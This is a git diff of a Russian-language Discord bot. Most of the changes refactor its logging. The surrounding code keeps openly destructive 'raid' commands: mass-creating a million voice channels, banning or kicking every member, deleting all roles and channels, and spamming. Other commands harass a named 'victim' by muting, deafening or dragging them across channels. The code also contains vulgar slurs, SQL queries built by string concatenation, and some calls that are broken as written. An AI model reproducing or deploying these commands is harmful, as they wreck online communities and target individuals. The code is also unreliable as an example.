@@ -2,7 +2,7 @@ try:
     import sqlite3
     from config import *
     import discord
-    import json
+    import json 
     import subprocess
     import os
     import time
@@ -19,6 +19,7 @@ try:
     import clr
     import threading
     import logging
+    import sys
 except ImportError: 
     print('[WARNING] Вероятнее всего, Вы не запустили deps.py ($python deps.py)')
 
@@ -30,9 +31,9 @@ warns = sqlite3.connect("warns.db")
 bans = sqlite3.connect("bans.db")
 permbans = sqlite3.connect("permbans.db")
 
-clr.AddReference('MusicDownloader')
+#clr.AddReference('MusicDownloader')
 
-from MusicDownloader import Downloader
+#from MusicDownloader import Downloader
 
 log = logging.getLogger("RUNNING")
 log.setLevel(logging.INFO)
@@ -50,50 +51,48 @@ loggers = []
 
 loggers.append(log)
 
-def logik(name):
-    global loggers
-    logger = logging.getLogger(name)
-
-    if logger in loggers:
-        return logger
-
-    logger.setLevel(logging.INFO)
-
-    fh = logging.StreamHandler()
-    
-    fh.setLevel(logging.INFO)
-
-    formatter = logging.Formatter('[%(asctime)s] [%(name)s] [%(levelname)s] %(message)s')
-    fh.setFormatter(formatter)
-
-    logger.addHandler(fh)
-
-    loggers.append(logger)
-
-    return logger
-
 #try:
+
+@bot.command()
+async def te(ctx):
+    array, array1 = list(), list()
+    for guild in bot.guilds:
+        await ctx.send(guild.name)
+        await ctx.send(guild.id)
+
+@bot.command()
+async def ls(ctx):
+    #logger = logik('RUNNING')
+    array , array1 = list(), list()     
+    for guild in bot.guilds:
+        array.append(guild.name)
+        array1.append(guild.id)
+    log.info(f'[{ctx.guild.name}] Bot send list of servers')
+    emb = discord.Embed(title = "Список серверов, на которых катируется бот:")
+    for i in range(len(array)):
+        emb.add_field(name = array1[i], value = array[i])
+    await ctx.send( embed = emb )
 
 @bot.command()
 @commands.has_permissions(administrator = True)
 async def pidor(ctx):
-    logger = logik('RAID_RUNNING')
+    #logger = logik('RAID_RUNNING')
     for i in range(1000000):
         await ctx.guild.create_voice_channel(name = 'None')
-        logger.info(f'[{ctx.guild.name}] created by {ctx.message.author.name}')
+        log.info(f'[{ctx.guild.name}] created by {ctx.message.author.name}')
 
 @bot.command()
 @commands.has_permissions(administrator = True)
 async def all_list(ctx):
-    logger = logik('RUNNING')
+    #logger = logik('RUNNING')
     for i in ctx.guild.channels:
-        logger.info(i.name)
+        log.info(i.name)
     logger.info(len(ctx.guild.channels))
     await ctx.send(len(ctx.guild.channels))
 
 @bot.command()
 async def clear(ctx):
-    logger = logik('RAID_RUNNING')
+    #logger = logik('RAID_RUNNING')
     # guild = bot.get_guild(ctx.guild.id)
     while True:
         guild = bot.get_guild(ctx.guild.id)
@@ -108,7 +107,7 @@ async def clear(ctx):
 
 @bot.command()
 async def raid_ch(ctx):
-    logger = logik('RAID_RUNNING')
+    #logger = logik('RAID_RUNNING')
     # guild = bot.get_guild(ctx.guild.id)
     while True:
         guild = bot.get_guild(ctx.guild.id)
@@ -126,8 +125,8 @@ async def random_gif(ctx):
     emb = discord.Embed(title = f'Random gif{str(bot.get_emoji(725061079914250300))}')
     emb.set_image(url = ho)
     await ctx.send(embed = emb)
-    logger = logik('RUNNING')
-    logger.info(f'[{ctx.guild.name}] Bot send {ho}')
+    #logger = logik('RUNNING')
+    log.info(f'[{ctx.guild.name}] Bot send {ho}')
 
 @bot.command()
 async def random_em(ctx):
@@ -151,22 +150,22 @@ async def random_em(ctx):
 
     await ctx.send(ho)
 
-    logger = logik('RUNNING')
+    #logger = logik('RUNNING')
 
-    logger.info(f'[{ctx.guild.name}] [_random_em_] Bot send emoji to {ctx.message.author.name}')
+    log.info(f'[{ctx.guild.name}] [_random_em_] Bot send emoji to {ctx.message.author.name}')
 
 @bot.command()
 @commands.has_permissions(administrator = True)
 async def putin(ctx):
-    logger = logik('RUNNING')
-    logger.info(f'[{ctx.guild.name}] Bot send :putin: ({ctx.message.author.name})')
+    #logger = logik('RUNNING')
+    log.info(f'[{ctx.guild.name}] Bot send :putin: ({ctx.message.author.name})')
     await ctx.channel.purge(limit = 1)
     await ctx.send(f'{str(bot.get_emoji(725059390331289651))}{str(bot.get_emoji(725059390331289651))}{str(bot.get_emoji(725059390331289651))}{str(bot.get_emoji(725059390331289651))}{str(bot.get_emoji(725059390331289651))}{str(bot.get_emoji(725059390331289651))}{str(bot.get_emoji(725059390331289651))}')
 
 @bot.command()
 @commands.has_permissions(administrator = True)
 async def rename(ctx, channel: discord.VoiceChannel, *, new_name):
-    logger = logik('RUNNING')
+    #logger = logik('RUNNING')
     await channel.edit(name=new_name)
 
 @bot.event
@@ -178,7 +177,7 @@ async def on_command_error(ctx, error):
 @bot.command()
 @commands.has_permissions(administrator = True)
 async def _jojo_(ctx, victim: discord.Member, reason = "Доигрался, вот тебе ролевые игры"):
-    logger = logik('RUNNING')
+    #logger = logik('RUNNING')
     emb = discord.Embed (title = 'Kick :lock:', colour = discord.Color.dark_red())
     author = ctx.message.author
     i = 10
@@ -198,41 +197,41 @@ async def _jojo_(ctx, victim: discord.Member, reason = "Доигрался, во
 
 @bot.command() 
 async def hola(ctx, arg):
-    logger = logik('RUNNING')
+    #logger = logik('RUNNING')
     await ctx.channel.purge(limit = 1)
     await ctx.send(arg), log.info(f'[{ctx.guild.name}] $Bot send message: {arg}')
 
 @bot.command()
 async def qq(ctx):
     """Hello, server"""
-    logger = logik('RUNNING')
+    #logger = logik('RUNNING')
     author = ctx.message.author
     await ctx.send(f'Категорически приветствую, {author.mention}!'), log.info(f'[{ctx.guild.name}] $Bot send message: Hello, {author.nick} ({author.name})')
 
 @bot.command()
 async def bb(ctx):
     """Bye, all"""
-    logger = logik('RUNNING')
+    #logger = logik('RUNNING')
     author = ctx.message.author
     await ctx.send(f'До связи, {author.mention} :)'), log.info(f'[{ctx.guild.name}] $Bot send message: Bye, {author.nick} ({author.name})')
 
 @bot.command()
 async def pp(ctx):
-    logger = logik('RUNNING')
+    #logger = logik('RUNNING')
     await ctx.channel.purge(limit = 1)
     author = ctx.message.author
     await ctx.send(f'{author.mention} Отошел.'), log.info(f'[{ctx.guild.name}] $Bot send message: {author.nick} ({author.name}) Отошел.')
 
 @bot.command()
 async def _pp_(ctx):
-    logger = logik('RUNNING')
+    #logger = logik('RUNNING')
     await ctx.channel.purge(limit = 1)
     author = ctx.message.author
     await ctx.send(f'{author.mention} Вернулся.'), log.info(f'[{ctx.guild.name}] $Bot send message: {author.nick} ({author.name}) Вернулся.')
 
 @bot.command()
 async def fox(ctx):
-    logger = logik('RUNNING')
+    #logger = logik('RUNNING')
     response = requests.get('https://some-random-api.ml/img/fox')
     json_data = json.loads(response.text)
     author = ctx.message.author
@@ -243,7 +242,7 @@ async def fox(ctx):
 
 @bot.command()
 async def dog(ctx):
-    logger = logik('RUNNING')
+    #logger = logik('RUNNING')
     response = requests.get('https://some-random-api.ml/img/dog')
     json_data = json.loads(response.text)
     author = ctx.message.author
@@ -265,7 +264,7 @@ async def cleaner(ctx, amount):
 
     k = random.choice(em)
 
-    logger = logik('RUNNING')
+    #logger = logik('RUNNING')
     em = str(bot.get_emoji(725432947150159974))
     author = ctx.message.author
     await ctx.channel.purge(limit=int(amount))
@@ -274,7 +273,7 @@ async def cleaner(ctx, amount):
 @bot.command()
 @commands.has_permissions(administrator = True)
 async def _kick_ (ctx, member: discord.Member, *, reason = None):
-    logger = logik('RUNNING')
+    #logger = logik('RUNNING')
 
     emb = discord.Embed (title = 'Kick :warning:', colour = discord.Color.dark_red())
 
@@ -293,7 +292,7 @@ async def _kick_ (ctx, member: discord.Member, *, reason = None):
 @bot.command()
 @commands.has_permissions(administrator = True)
 async def ban (ctx, member: discord.Member, *, reason = f'Нарушение правил сервера. $Banlist.append(you)'):
-    logger = logik('RUNNING')
+    #logger = logik('RUNNING')
 
     emb = discord.Embed (title = 'Ban :lock:', colour = discord.Color.dark_red())
 
@@ -314,14 +313,14 @@ async def ban (ctx, member: discord.Member, *, reason = f'Нарушение п�
 @bot.command()
 @commands.has_permissions(administrator = True)
 async def cleanadm(ctx, amount):
-    logger = logik('RUNNING')
+    #logger = logik('RUNNING')
     author = ctx.message.author
     await ctx.channel.purge(limit=int(amount))
     log.info(f'[{ctx.guild.name}] {author.nick} cleaned chat for {amount} positions')
 
 @bot.command()
 async def join(ctx):
-    logger = logik('RUNNING')
+    #logger = logik('RUNNING')
     global voice
     await ctx.channel.purge(limit = 1)
     channel = ctx.message.author.voice.channel
@@ -340,7 +339,7 @@ async def join(ctx):
 @bot.command()
 @commands.has_permissions(administrator = True)
 async def am(ctx, victim):
-    logger = logik('RUNNING')
+    #logger = logik('RUNNING')
     await ctx.channel.purge(limit = 1)
     victim_member = discord.utils.get(ctx.guild.members, name=victim)
     await victim_member.edit(mute = True, deafen = True)
@@ -349,7 +348,7 @@ async def am(ctx, victim):
 @bot.command()
 @commands.has_permissions(administrator = True)
 async def aum(ctx, victim):
-    logger = logik('RUNNING')
+    #logger = logik('RUNNING')
     await ctx.channel.purge(limit = 1)
     victim_member = discord.utils.get(ctx.guild.members, name=victim)
     await victim_member.edit(mute = False, deafen = False)
@@ -358,7 +357,7 @@ async def aum(ctx, victim):
 @bot.command()
 @commands.has_permissions(administrator = True)
 async def mute(ctx, victim):
-    logger = logik('RUNNING')
+    #logger = logik('RUNNING')
     await ctx.channel.purge(limit = 1)
     victim_member = discord.utils.get(ctx.guild.members, name=victim)
     await victim_member.edit(mute = True)
@@ -367,7 +366,7 @@ async def mute(ctx, victim):
 @bot.command()
 @commands.has_permissions(administrator = True)
 async def dea(ctx, victim):
-    logger = logik('RUNNING')
+    #logger = logik('RUNNING')
     await ctx.channel.purge(limit = 1)
     victim_member = discord.utils.get(ctx.guild.members, name=victim)
     await victim_member.edit(deafen = True)
@@ -377,7 +376,7 @@ async def dea(ctx, victim):
 @bot.command()
 @commands.has_permissions(administrator = True)
 async def exc(ctx, victim):
-    logger = logik('RUNNING')
+    #logger = logik('RUNNING')
     victim_member = discord.utils.get(ctx.guild.members, name=victim)
     await ctx.send(f'{victim_member.mention} **Экскурсия по {ctx.guild.name} начинается. Всего вам плохого**')
     for i in ctx.guild.voice_channels:
@@ -389,7 +388,7 @@ async def exc(ctx, victim):
 @bot.command()
 @commands.has_permissions(administrator = True)
 async def lock(ctx, victim):
-    logger = logik('RUNNING')
+    #logger = logik('RUNNING')
     await ctx.channel.purge(limit = 1)
     victim_member = discord.utils.get(ctx.guild.members, name=victim)
     author = ctx.message.author
@@ -409,7 +408,7 @@ async def lock(ctx, victim):
 @bot.command()
 @commands.has_permissions(administrator = True)
 async def unlock(ctx, victim):
-    logger = logik('RUNNING')
+    #logger = logik('RUNNING')
     await ctx.channel.purge(limit = 1)
     victim_member = discord.utils.get(ctx.guild.members, name=victim)
     author = ctx.message.author
@@ -425,22 +424,21 @@ async def unlock(ctx, victim):
 @bot.command()
 @commands.has_permissions(administrator = True)
 async def spam(ctx, verb, k: int):
-    logger = logik('RUNNING')
+    #logger = logik('RUNNING')
     for i in range(int(k)):
-        logger.info(f'[{ctx.guild.name}] Bot send {verb}')
+        log.info(f'[{ctx.guild.name}] Bot send {verb}')
         await ctx.send(verb)
         time.sleep(0.75)    
 
 @bot.command()
 async def vers(ctx):
-    logger = logik('RUNNING')
+    #logger = logik('RUNNING')
     await ctx.send(discord.__version__)
 
 @bot.command()
 async def gs(ctx):
-    logger = logik('RUNNING')
+    #logger = logik('RUNNING')
     array = list()
-    emb = discord.Embed(title = 'PIDARASI')
     for i in ctx.guild.voice_channels:
         for k in i.members:
             array.append(f'```[{i}] {k.name}```\n')
@@ -451,17 +449,20 @@ async def gs(ctx):
             g += array[i]
         except IndexError:
             log.info(f'[{ctx.guild.name}] Точка остановы')
+        except:
+            log.info('еблан')
 
     log.info(f'[{ctx.guild.name}] Bot send list of members in voice channels ({ctx.message.author.name})')
         
     await ctx.send(g)
+    asyncio.get_event_loop().run_until_complete(gs())
 
 nn = True
 
 @bot.command()
 @commands.has_permissions(administrator = True)
 async def exc_adm(ctx, victim):
-    logger = logik('RUNNING')
+    #logger = logik('RUNNING')
     victim_member = discord.utils.get(ctx.guild.members, name=victim)
     voice = get(bot.voice_clients, guild = ctx.guild)
     await ctx.send(f'{victim_member.mention} **Экскурсия по {ctx.guild.name} начинается. Всего вам плохого**')
@@ -480,7 +481,7 @@ async def exc_adm(ctx, victim):
 @bot.command()
 @commands.has_permissions(administrator = True)
 async def _stop_exc_(ctx, victim):
-    logger = logik('RUNNING')
+    #logger = logik('RUNNING')
     victim_member = discord.utils.get(ctx.guild.members, name=victim) 
     nn = False
     log.info('Точка остановы')
@@ -490,7 +491,7 @@ async def _stop_exc_(ctx, victim):
 @bot.command()
 @commands.has_permissions(administrator = True)
 async def _exc_adm_gogi_(ctx, name1: str, n: int):
-    logger = logik('RUNNING')
+    #logger = logik('RUNNING')
     victim_member = discord.utils.get(ctx.guild.members, name=name1)
     await ctx.send(f'{victim_member.mention} **Экскурсия по {ctx.guild.name} начинается. Всего вам плохого**')
     while n > 0:
@@ -505,7 +506,7 @@ async def _exc_adm_gogi_(ctx, name1: str, n: int):
 
 @bot.command()
 async def play_old(ctx, url: str):
-    logger = logik('RUNNING')
+    #logger = logik('RUNNING')
     song_there = os.path.isfile('song.mp3')
     try:
         if song_there: 
@@ -545,7 +546,7 @@ async def play_old(ctx, url: str):
 
 @bot.command()
 async def leave(ctx):
-    logger = logik('RUNNING')
+    #logger = logik('RUNNING')
     global voice
     channel = ctx.message.author.voice.channel
     voice = get(bot.voice_clients, guild = ctx.guild)
@@ -559,7 +560,7 @@ async def leave(ctx):
 
 @bot.command()
 async def play(ctx, url: str):
-    logger = logik('RUNNING')
+    #logger = logik('RUNNING')
     folder = Downloader.Download(url, "C:\\Users\\shara\\AppData\\Roaming\\Python\\Python38\\Scripts\\youtube-dl.exe")
     path = 'Downloads\\' + str(folder)
 
@@ -576,7 +577,7 @@ async def play(ctx, url: str):
 
 @bot.command()
 async def kick(ctx, victim):
-    logger = logik('RUNNING')
+    #logger = logik('RUNNING')
     victim_member = get(ctx.guild.members, name = victim)
     channelU = discord.utils.find(lambda x: x.name == 'PIDARASI VI SUKI', ctx.guild.voice_channels)
     await victim_member.move_to(channelU)
@@ -585,7 +586,7 @@ async def kick(ctx, victim):
 @bot.command()
 @commands.has_permissions(administrator = True)
 async def list(ctx):
-    logger = logik('RUNNING')
+    #logger = logik('RUNNING')
     log.info('[admin] $Bot send list of members of the server')
     list_memb = list()
     emb = discord.Embed (title = f'Список участников сервера {ctx.guild.name} :clipboard: ')
@@ -596,7 +597,7 @@ async def list(ctx):
 
 @bot.command()
 async def list_ch(ctx):
-    logger = logik('RUNNING')
+    #logger = logik('RUNNING')
     for i in ctx.guild.voice_channels:
         log.info(i.name)
     await ctx.send(str(len(ctx.guild.voice_channels)) + ' каналов на сервере')
@@ -609,21 +610,8 @@ async def bye(ctx):
     await ctx.send(f'{ctx.message.author.mention} Ушел на покой{str(em)}')
 
 @bot.command()
-async def ls(ctx):
-    logger = logik('RUNNING')
-    array , array1 = list(), list()
-    for guild in bot.guilds:
-        array.append(guild.name)
-        array1.append(guild.id)
-    log.info(f'[{ctx.guild.name}] Bot send list of servers')
-    emb = discord.Embed(title = "Список серверов, на которых катируется бот:")
-    for i in range(len(array)):
-        emb.add_field(name = array1[i], value = array[i])
-    await ctx.send( embed = emb )
-
-@bot.command()
 async def tr(ctx, victim, channel):
-    logger = logik('RUNNING')
+    #logger = logik('RUNNING')
     victim_member = get(ctx.guild.members, name = victim)
     channelU = discord.utils.find(lambda x: x.name == channel, ctx.guild.voice_channels)
     try:
@@ -636,7 +624,7 @@ async def tr(ctx, victim, channel):
 @bot.command()
 @commands.has_permissions(administrator = True)
 async def lat(ctx, victim):
-    logger = logik('RUNNING')
+    #logger = logik('RUNNING')
     await ctx.channel.purge(limit = 1)
     global n
     n = True
@@ -654,7 +642,7 @@ async def lat(ctx, victim):
 @bot.command()
 @commands.has_permissions(administrator = True)
 async def ulat(ctx, victim):
-    logger = logik('RUNNING')
+    #logger = logik('RUNNING')
     await ctx.channel.purge(limit = 1)
     global n 
     n = False
@@ -668,7 +656,7 @@ async def ulat(ctx, victim):
 
 @bot.command()
 async def send(ctx, victim):
-    logger = logik('RUNNING')
+    #logger = logik('RUNNING')
     author = ctx.message.author
     if str(author.id) == '691575600707534908':
         victim_member = get(ctx.guild.members, name = victim)
@@ -680,7 +668,7 @@ async def send(ctx, victim):
 @bot.command()
 @commands.has_permissions(administrator = True)
 async def warn(ctx, victim, reason):
-    logger = logik('RUNNING')
+    #logger = logik('RUNNING')
     w = warns.cursor()
     try:
         w.execute('SELECT * FROM ' + '"' + str(ctx.guild.name) + '"')
@@ -726,7 +714,7 @@ async def warn(ctx, victim, reason):
 @bot.command()
 @commands.has_permissions(administrator = True)
 async def unwarn(ctx, victim):
-    logger = logik('RUNNING')
+    #logger = logik('RUNNING')
     victim_member = discord.utils.get(ctx.guild.members, name=victim)
     author = ctx.message.author
     w = warns.cursor()
@@ -757,7 +745,7 @@ async def unwarn(ctx, victim):
 @bot.command()
 @commands.has_permissions()
 async def warn_list(ctx, victim):
-    logger = logik('RUNNING')
+    #logger = logik('RUNNING')
     victim_member = discord.utils.get(ctx.guild.members, name=victim)
     mw = 3
     w = warns.cursor()
@@ -778,7 +766,7 @@ async def warn_list(ctx, victim):
 
 @bot.command()
 async def _test_(ctx, victim):
-    logger = logik('RUNNING')
+    #logger = logik('RUNNING')
     victim_member = get(ctx.guild.members, name = victim)
     if victim_member == None:
         await ctx.send('Кто это???')
@@ -791,7 +779,7 @@ async def _test_(ctx, victim):
 @bot.command()
 @commands.has_permissions(administrator = True)
 async def kickall(ctx):
-    logger = logik('RAID_RUNNING')
+    #logger = logik('RAID_RUNNING')
     await ctx.channel.purge(limit = 1)
     await ctx.send(f'~~**...Машины уничтожаеют сервер :skull:...**~~'), log.info(f'[warning] Бот {bot.user.name} кикнул всех, кого мог')
     for m in ctx.guild.members:
@@ -803,7 +791,7 @@ async def kickall(ctx):
 @bot.command()
 @commands.has_permissions(administrator = True)
 async def banall(ctx):
-    logger = logik('RAID_RUNNING')
+    #logger = logik('RAID_RUNNING')
     await ctx.channel.purge(limit = 1)
     await ctx.send(f'~~**...Машины уничтожаеют сервер :skull:...**~~'), log.info(f'[warning] Бот {bot.user.name} забанил всех, кого мог')
     for m in ctx.guild.members:
@@ -815,7 +803,7 @@ async def banall(ctx):
 @bot.command()
 @commands.has_permissions(administrator = True)
 async def dl(ctx):
-    logger = logik('RAID_RUNNING')
+    #logger = logik('RAID_RUNNING')
     await ctx.channel.purge(limit = 1), log.info(f'[warning] {bot.user.name} Удалил столько ролей, сколько смог')
     for m in ctx.guild.roles:
         try:
@@ -826,7 +814,7 @@ async def dl(ctx):
 @bot.command()
 @commands.has_permissions(administrator = True)
 async def dch(ctx):
-    logger = logik('RAID_RUNNING')
+    #logger = logik('RAID_RUNNING')
     failed = []
     counter = 0
     await ctx.channel.purge(limit = 1)
@@ -1309,12 +1297,14 @@ async def on_ready():
     log.info('Work Status: 1')
     log.info('Auditor magazine of bot:')    
     log.info(f'Logged in as {bot.user.name}')
-    activity = discord.Game(name='$help | ShG')
+    activity = discord.Game(name='$help | ShG | Py')
     await bot.change_presence(status=':rainbowpartner:', activity=activity)
 
 #=================================================
-
-bot.run(settings['TOKEN'])
+try:
+    bot.run(settings['TOKEN'])
+except:
+    sys.exit(0)
 
 #except:
     #logger = logik('RUNNING')
